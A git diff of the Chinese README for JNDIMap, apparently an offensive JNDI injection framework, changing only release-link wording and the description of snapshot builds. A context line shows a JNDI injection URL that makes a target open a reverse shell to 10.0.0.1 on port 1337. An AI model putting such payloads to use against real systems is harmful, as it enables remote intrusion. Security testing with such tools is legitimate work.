@@ -19,7 +19,7 @@ JNDIMap 是一个强大的 JNDI 注入利用框架, 支持 RMI、LDAP 和 LDAPS 
 
 ## 🚀 快速上手
 
-在 [Release](https://github.com/X1r0z/JNDIMap/releases) 页面下载 JNDIMap, 运行时传入 `-i` 参数指定外部 IP
+在 [Releases](https://github.com/X1r0z/JNDIMap/releases) 页面下载 JNDIMap, 运行时传入 `-i` 参数指定外部 IP
 
 ```bash
 java -jar JNDIMap-version.jar -i 10.0.0.1
@@ -87,7 +87,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 ## ⚙️ 编译
 
-[Releases](https://github.com/X1r0z/JNDIMap/releases) 的版本可能存在滞后, 推荐在使用时拉取源码自行编译 (基于 JDK 8)
+[Releases](https://github.com/X1r0z/JNDIMap/releases) 包含稳定版和 snapshot 版 (基于 main 分支自动构建的最新版本), 你也可以在使用时拉取源码自行编译 (基于 JDK 8)
 
 ```bash
 git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
